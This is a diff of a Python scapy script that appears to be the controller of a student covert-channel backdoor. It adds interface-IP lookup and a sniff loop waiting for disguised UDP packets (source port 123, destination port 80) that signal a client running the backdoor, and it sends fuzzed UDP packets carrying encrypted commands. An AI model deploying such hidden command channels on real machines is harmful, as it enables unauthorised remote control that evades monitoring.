@@ -9,14 +9,54 @@ from scapy.all import *
 from encrypt import *
 import argparse
 import sys
+import socket
+import fcntl
+import struct
 
 pw = ""
 mypacket = IP()
-srcIp = "192.168.0.9"
-desIp = "192.168.0.8"
+serv_addr = "192.168.0.16"	# by default
+clnt_addr = "192.168.1.8"	# by default
+
+
+def get_ip_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    return socket.inet_ntoa(fcntl.ioctl(
+        s.fileno(),
+        0x8915,  # SIOCGIFADDR
+        struct.pack('256s', ifname[:15])
+    )[20:24])
+
+
+def parse_arguments():
+	parser = argparse.ArgumentParser()
+	group = parser.add_mutually_exclusive_group()
+	# group.add_argument("-i", "--net_int", action="store")
+	group.add_argument("-d", "--dest_ip", action="store")
+	return parser.parse_args()
+
+def client_ran_backdoor(pkt):
+	print "client ran backdoor"
+
 
 def main():
 	global pw
+	#args = parse_arguments()
+
+	# get network interface
+	serv_addr = get_ip_address('eno1')
+
+
+	# wait until client run backdoor program
+	while True:
+		print "Sniffing..."
+		sniff(filter="udp and dst port 80 and src port 123", prn=client_ran_backdoor)
+
+
+	#if(args.dest_ip is not None):
+	# store backdoor client address
+	#clnt_addr = args.dest_ip   
+
 	# ask for the password for encryption
 	pw = raw_input("Set a password for encryption: ")
 
@@ -29,8 +69,9 @@ def main():
 	# how to put random data on each field
 	
 	mypacket = IP()/fuzz(UDP())
-	mypacket.src = srcIp
-	mypacket.dst = desIp
+	print serv_addr
+	mypacket.src = serv_addr
+	mypacket.dst = clnt_addr
 
 	#print enc_cmd
 	i = 0
